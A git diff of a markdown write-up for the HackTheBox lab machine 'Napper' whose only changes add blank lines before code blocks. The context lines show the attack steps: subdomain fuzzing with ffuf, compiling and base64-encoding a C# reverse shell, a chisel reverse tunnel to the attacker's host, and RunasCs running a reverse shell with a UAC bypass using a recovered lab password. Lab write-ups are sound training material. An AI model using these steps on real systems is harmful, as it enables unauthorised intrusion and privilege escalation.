@@ -26,6 +26,7 @@ Add to /etc/hosts:
 **<u>Subdomain enumeration:</u>**
 
 - For HTTPS sites use ffuf:
+  
 ```bash
 ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -u https://napper.htb -H "Host: FUZZ.napper.htb" --fs 5602
 
@@ -95,6 +96,7 @@ So the final code will be :
 ![image14](../resources/77266785a7504b60bf9110b4089eb286.png)
 
 - Now we need to compile the C# code:
+  
 ```bash
 mcs -out:ConnectBack.exe rev_shell.cs
 
@@ -103,6 +105,7 @@ mcs -out:ConnectBack.exe rev_shell.cs
 ![image15](../resources/a6691f18a99e4269a80ea0db346bcf10.png)
 
 - Base64 the .exe and copy the code:
+
 ```bash
 base64 ConnectBack.exe
 
@@ -193,11 +196,13 @@ rather than being interpreted as a variable
 
 - Upload chisel - so we can access the site:
   - On Kali:
+    
 ```bash
 chisel server -p 8888 --reverse
 
 ```
 - On target:
+  
 ```bash
 .\chisel.exe client 10.10.14.50:8888 R:socks
 
@@ -347,12 +352,14 @@ func main() {
 - Upload RunasCS
 - Set up a listener
 
-- Build the go file  
+- Build the go file
+  
 ```bash
 go build decrypt.go
 
 ```
 - Get the updated blob and seed and run the go program:
+  
 ```bash
 go run decrypt.go -seed=29268452 -data="febmF1H0JlQFI97jPs87bLjUqBbG6VS_udL8MQ0pvduoDXJuftLW3td74B0KrJdB2Ra19btk0M0="
 
@@ -361,6 +368,7 @@ go run decrypt.go -seed=29268452 -data="febmF1H0JlQFI97jPs87bLjUqBbG6VS_udL8MQ0p
 ![image35](../resources/ddf0fc0889f2461d9b236db0c107bdb1.png)
 
 - Use the password generated and run the reverse shell with RunasCS
+  
 ```bash
 .\RunasCs.exe backup ksjWToylCIXHbCmDKBnjwcKGJVUOLPWCNqnDAPAA ".\backup_reverse.exe" --bypass-uac
 
@@ -369,6 +377,7 @@ go run decrypt.go -seed=29268452 -data="febmF1H0JlQFI97jPs87bLjUqBbG6VS_udL8MQ0p
 ![image36](../resources/1be04e6fb3c948c197ce67530a06cf8b.png)
 
 - Backup user has rights to Administrator
+  
 ```bash
 type root.txt
 
